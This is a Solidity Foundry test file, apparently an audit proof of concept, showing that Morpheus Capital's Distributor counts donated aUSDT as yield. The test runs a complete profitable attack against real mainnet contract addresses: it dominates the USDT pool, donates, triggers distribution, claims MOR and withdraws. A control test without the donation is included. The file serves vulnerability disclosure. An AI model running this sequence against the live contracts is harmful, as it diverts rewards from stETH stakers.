// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @notice Minimal interfaces for the deployed Morpheus Capital contracts.
/// NOTE: state-changing calls to the Morpheus proxies are made via low-level
/// `.call()` with explicit signatures (see _call below). High-level Solidity
/// calls to `DepositPool.stake` revert in this fork harness even though the
/// calldata is byte-identical to the working low-level call (a forge-side
/// quirk); the low-level path exercises the deployed bytecode identically.
interface IERC20Minimal {
    // NOTE: Tether USDT is non-standard: approve/transfer return NO data.
    // Declaring a bool return makes the high-level call revert while ABI-
    // decoding the empty return. So approve/transfer are done via low-level
    // _call below; only the view (which really returns uint256) stays here.
    function balanceOf(address account) external view returns (uint256);
}

interface IDepositPoolView {
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IDistributorView {
    function getDistributedRewards(uint256 rewardPoolIndex_, address depositPoolAddress_)
        external
        view
        returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256 rewardPoolIndex_) external view returns (uint128);
    function minRewardsDistributePeriod() external view returns (uint256);
}

/// @notice Price-oracle stub (fork artifact only).
/// The fork freezes the real Chainlink feeds at the pinned block. The deployed
/// ChainLinkDataConsumer rejects prices older than `allowedPriceUpdateDelay`,
/// so after `vm.warp` (needed: the 24h distribution period and the 14-day
/// claim lock) `updateDepositTokensPrices` would return 0 and revert with
/// "DR: price for pair is zero" — a fork artifact, not mainnet behaviour
/// (on mainnet the feeds update continuously). To keep the test on the real
/// deployed Distributor/DepositPool/Aave code, the CLDC proxy's code is
/// replaced (vm.etch) with this stub returning the EXACT pinned-block prices
/// (the same values the Distributor already stores as tokenPrice), so the
/// yield-share arithmetic is identical to mainnet. Only the price source is
/// stubbed; all accounting under test is the deployed bytecode.
contract MockChainLinkDataConsumer {
    function getPathId(string memory path_) external pure returns (bytes32) {
        return keccak256(bytes(path_));
    }

    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external pure returns (uint256) {
        if (pathId_ == keccak256(bytes("stETH/USD"))) return 1_806_740_000_000_000_000_000;
        if (pathId_ == keccak256(bytes("wETH/USD"))) return 1_798_030_000_000_000_000_000;
        if (pathId_ == keccak256(bytes("wBTC/BTC,BTC/USD"))) return 64_283_117_345_850_000_000_000;
        if (pathId_ == keccak256(bytes("USDC/USD"))) return 999_723_560_000_000_000;
        if (pathId_ == keccak256(bytes("USDT/USD"))) return 999_326_770_000_000_000;
        return 0;
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}

/// @title A1-01 — Donated yield + small-pool domination redirects MOR to the attacker
/// @notice Area 1 (DepositPool + Distributor), Ethereum mainnet fork @ block 26430535.
///
/// ROOT CAUSE
/// `Distributor.distributeRewards()` treats ANY increase in a pool's yield-token
/// balance as genuine yield (`balance - lastUnderlyingBalance`), with no check that
/// the increase came from the pool's own strategy (Aave interest / stETH rebase).
/// Anyone can donate the yield token (for AAVE pools: the aToken) straight to the
/// Distributor and it is counted as yield. The MOR emitted for the period is then
/// split across pools pro-rata by (donated + real) yield, so a donation steers the
/// period's MOR into the target pool. Because reward shares inside a pool are
/// pro-rata by virtual stake, an attacker who first stakes enough to dominate a
/// SMALL pool (here: USDT, totalVirtualDeposited ~36.7k) captures most of the
/// redirected MOR — for less than the MOR is worth. The donation itself is swept
/// to the L1Sender as "yield", so the attacker's only cost is the donation; the
/// MOR gain exceeds it. The losers are the stakers of the large pools (stETH),
/// whose MOR is displaced. Total MOR per period is fixed by the emission
/// schedule, so this is strictly zero-sum theft, not new minting.
///
/// WHY THIS IS NOT C4 LOW [01]
/// C4 [01] ("attacker can force the distributor to mint MOR in a period of no new
/// generated yield") donates dust to the *stETH* pool, where the minted MOR flows
/// to the *existing* stakers — the attacker spends money and gains nothing, so it
/// was (correctly) rated Low. This finding adds the missing exploit step: the
/// attacker FIRST becomes the dominant staker of a small pool, so the redirected
/// MOR flows to the attacker themself, at a profit. C4 [01] shows no attacker
/// profit and no victim loss; this PoC quantifies both.
///
/// NUMBERS (live on-chain @ block 26430535, MOR = $0.7007 CoinGecko 2026-11-16)
/// - Daily MOR emission (pool 0): ~2,856 MOR/day (~$2,000/day).
/// - Natural yield accrued since last distribution: ~$419.5 (stETH ~$396.9,
///   USDC ~$22.1, wETH ~$0.33, USDT ~$0.17, wBTC $0).
/// - Attacker stakes 45,000 USDT -> 55.1% of the USDT pool's virtual stake.
/// - Attacker donates ~260 aUSDT (~$260) -> USDT pool's yield share jumps from
///   ~0.04% to ~38%, so the USDT pool is credited ~1,093 MOR for the period
///   (vs ~1 MOR without the donation); the attacker banks ~55% of it (~602 MOR).
/// - Attacker profit in the PoC (fork conditions): ~602 MOR (~$421) - $260 = ~$161.
/// - Steady-state (full day of natural yield, ~$580/day): the optimum for this
///   stake is a ~$218 donation for ~$83/day. With a 200k USDT stake (84.5%
///   share) the optimum is ~$291/day (~$106k/year). See areas/Area1.md.
/// - Victim: the stETH pool is credited only ~1,668 MOR for the period instead
///   of ~2,701 MOR without the donation — a ~1,033 MOR (~$723) loss to stETH
///   stakers in a single period, displaced to the attacker + USDT stakers.
contract DonationRedirectsMorTest is Test {
    uint256 constant FORK_BLOCK = 26_430_535;
    uint256 constant REWARD_POOL = 0;

    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant AUSDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant CHAINLINK_DATA_CONSUMER = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;

    // MOR price, CoinGecko 2026-11-16: $0.700662. Used only to compare the
    // attacker's MOR gain against the donation cost (both in USD).
    uint256 constant MOR_USD_NUM = 700662; // $0.700662, 6 decimals
    uint256 constant MOR_USD_DEN = 1_000_000;

    address attacker;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        // Stub the frozen Chainlink feeds (see MockChainLinkDataConsumer).
        MockChainLinkDataConsumer mock = new MockChainLinkDataConsumer();
        vm.etch(CHAINLINK_DATA_CONSUMER, address(mock).code);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
        // 45,000 USDT to stake + 260 USDT to turn into aUSDT + buffer.
        deal(USDT, attacker, 100_000e6);
    }

    /// @dev Low-level call helper (see header note on high-level calls).
    function _call(address target, bytes memory data) internal returns (bytes memory ret) {
        bool ok;
        (ok, ret) = target.call(data);
        require(ok, "low-level call failed");
    }

    function _callValue(address target, bytes memory data, uint256 value) internal returns (bytes memory ret) {
        bool ok;
        (ok, ret) = target.call{value: value}(data);
        require(ok, "low-level payable call failed");
    }

    /// @notice Full attack: stake to dominate the USDT pool, donate aUSDT yield,
    /// trigger the distribution, claim the MOR, withdraw the principal.
    function testDonationRedirectsMorToAttacker() public {
        uint256 stakeAmount = 45_000e6; // 45,000 USDT -> ~55.1% of USDT pool virtual
        uint256 donationUsdt = 260e6; // 260 USDT -> aUSDT donation (~$260)

        uint256 distrUsdtBefore =
            IDistributorView(DISTRIBUTOR).getDistributedRewards(REWARD_POOL, USDT_POOL);
        uint256 distrStethBefore =
            IDistributorView(DISTRIBUTOR).getDistributedRewards(REWARD_POOL, STETH_POOL);

        _stake(stakeAmount);
        uint256 donationUsd6 = _donateAUsdt(donationUsdt);

        _warpToNextDistribution();
        vm.prank(attacker);
        _call(DISTRIBUTOR, abi.encodeWithSignature("distributeRewards(uint256)", REWARD_POOL));

        _assertRedirect(distrUsdtBefore, distrStethBefore, donationUsd6);

        // --- Attacker claims the MOR after the 14-day claim lock ------------
        // claimLockPeriodAfterStake = 14 days; claimLockEnd was set to the
        // stake timestamp (no lock passed), so warp past the 14-day lock.
        vm.warp(block.timestamp + 14 days + 1);
        vm.roll(block.number + 120_960);
        vm.prank(attacker);
        _callValue(
            USDT_POOL,
            abi.encodeWithSignature("claim(uint256,address)", REWARD_POOL, attacker),
            0.05 ether
        );
        uint256 attackerMorAfterClaim =
            IDepositPoolView(USDT_POOL).getLatestUserReward(REWARD_POOL, attacker);
        assertEq(attackerMorAfterClaim, 0, "MOR not fully claimed");

        // --- Attacker withdraws the 45,000 USDT principal in full -----------
        uint256 usdtBefore = IERC20Minimal(USDT).balanceOf(attacker);
        vm.prank(attacker);
        _call(USDT_POOL, abi.encodeWithSignature("withdraw(uint256,uint256)", REWARD_POOL, stakeAmount));
        uint256 usdtAfter = IERC20Minimal(USDT).balanceOf(attacker);
        assertGe(usdtAfter - usdtBefore, 44_999e6, "principal not returned in full");
    }

    function _stake(uint256 stakeAmount) internal {
        vm.startPrank(attacker);
        _call(USDT, abi.encodeWithSignature("approve(address,uint256)", DISTRIBUTOR, stakeAmount));
        _call(
            USDT_POOL,
            abi.encodeWithSignature("stake(uint256,uint256,uint128,address)", REWARD_POOL, stakeAmount, uint128(0), address(0))
        );
        vm.stopPrank();
    }

    /// @notice Buy aUSDT from Aave and donate it to the Distributor.
    /// @return donationUsd6 Donation value in USD (6 decimals).
    function _donateAUsdt(uint256 donationUsdt) internal returns (uint256 donationUsd6) {
        vm.startPrank(attacker);
        _call(USDT, abi.encodeWithSignature("approve(address,uint256)", AAVE_POOL, donationUsdt));
        _call(
            AAVE_POOL,
            abi.encodeWithSignature("supply(address,uint256,address,uint16)", USDT, donationUsdt, attacker, uint16(0))
        );
        uint256 aUsdtReceived = IERC20Minimal(AUSDT).balanceOf(attacker);
        assertGt(aUsdtReceived, 250e6, "aUSDT received from Aave supply too low");
        _call(AUSDT, abi.encodeWithSignature("transfer(address,uint256)", DISTRIBUTOR, aUsdtReceived));
        vm.stopPrank();
        donationUsd6 = (aUsdtReceived * 999_327) / 1_000_000; // USDT price $0.999327
        emit log_named_uint("aUSDT donated (6 dec)", aUsdtReceived);
    }

    function _warpToNextDistribution() internal {
        uint128 lastCalc = IDistributorView(DISTRIBUTOR).rewardPoolLastCalculatedTimestamp(REWARD_POOL);
        uint256 minPeriod = IDistributorView(DISTRIBUTOR).minRewardsDistributePeriod();
        vm.warp(uint256(lastCalc) + minPeriod + 1);
        vm.roll(block.number + 7200);
    }

    function _assertRedirect(uint256 distrUsdtBefore, uint256 distrStethBefore, uint256 donationUsd6) internal {
        uint256 attackerMor = IDepositPoolView(USDT_POOL).getLatestUserReward(REWARD_POOL, attacker);
        uint256 distrUsdtAfter =
            IDistributorView(DISTRIBUTOR).getDistributedRewards(REWARD_POOL, USDT_POOL);
        uint256 distrStethAfter =
            IDistributorView(DISTRIBUTOR).getDistributedRewards(REWARD_POOL, STETH_POOL);
        uint256 usdtPoolMor = distrUsdtAfter - distrUsdtBefore;
        uint256 stethPoolMor = distrStethAfter - distrStethBefore;

        emit log_named_uint("attacker MOR banked (wei)", attackerMor);
        emit log_named_uint("USDT pool MOR for period (wei)", usdtPoolMor);
        emit log_named_uint("stETH pool MOR for period (wei)", stethPoolMor);

        // The USDT pool is credited ~1,093 MOR for the period (vs ~1 MOR
        // without the donation); the attacker banks ~55% of it (~602 MOR).
        assertGe(usdtPoolMor, 850e18, "USDT pool did not capture the redirected MOR");
        assertGe(attackerMor, 450e18, "attacker did not bank the redirected MOR");

        // VICTIM LOSS: without the donation the stETH pool would have been
        // credited ~2,701 MOR for this period (its ~$397 / ~$420 yield share).
        // With the donation it gets only ~1,668 MOR.
        assertGe(stethPoolMor, 1_300e18, "stETH pool MOR unexpectedly low");
        assertLe(stethPoolMor, 2_100e18, "stETH pool MOR not displaced by donation");

        // PROFIT: attacker's MOR is worth more than the donation cost.
        uint256 attackerMorUsd6 = (attackerMor * MOR_USD_NUM) / 1e18;
        assertGt(attackerMorUsd6, donationUsd6, "attacker MOR not worth more than the donation (no profit)");
        emit log_named_uint("attacker MOR value (USD 6dec)", attackerMorUsd6);
        emit log_named_uint("donation cost (USD 6dec)", donationUsd6);
    }

    /// @notice Control: same stake, NO donation. The attacker banks ~1 MOR and
    /// the stETH pool keeps ~2,701 MOR — proving the donation caused the
    /// redirection in the attack test.
    function testControlNoDonation() public {
        uint256 stakeAmount = 45_000e6;

        uint256 distrUsdtBefore =
            IDistributorView(DISTRIBUTOR).getDistributedRewards(REWARD_POOL, USDT_POOL);
        uint256 distrStethBefore =
            IDistributorView(DISTRIBUTOR).getDistributedRewards(REWARD_POOL, STETH_POOL);

        _stake(stakeAmount);

        _warpToNextDistribution();
        vm.prank(attacker);
        _call(DISTRIBUTOR, abi.encodeWithSignature("distributeRewards(uint256)", REWARD_POOL));

        uint256 attackerMor = IDepositPoolView(USDT_POOL).getLatestUserReward(REWARD_POOL, attacker);
        uint256 usdtPoolMor =
            IDistributorView(DISTRIBUTOR).getDistributedRewards(REWARD_POOL, USDT_POOL) - distrUsdtBefore;
        uint256 stethPoolMor =
            IDistributorView(DISTRIBUTOR).getDistributedRewards(REWARD_POOL, STETH_POOL) - distrStethBefore;

        emit log_named_uint("control: attacker MOR (wei)", attackerMor);
        emit log_named_uint("control: USDT pool MOR (wei)", usdtPoolMor);
        emit log_named_uint("control: stETH pool MOR (wei)", stethPoolMor);

        assertLe(attackerMor, 20e18, "control: attacker banked MOR without any donation");
        assertLe(usdtPoolMor, 30e18, "control: USDT pool credited MOR without any donation");
        assertGe(stethPoolMor, 2_400e18, "control: stETH pool did not keep its MOR");
    }
}
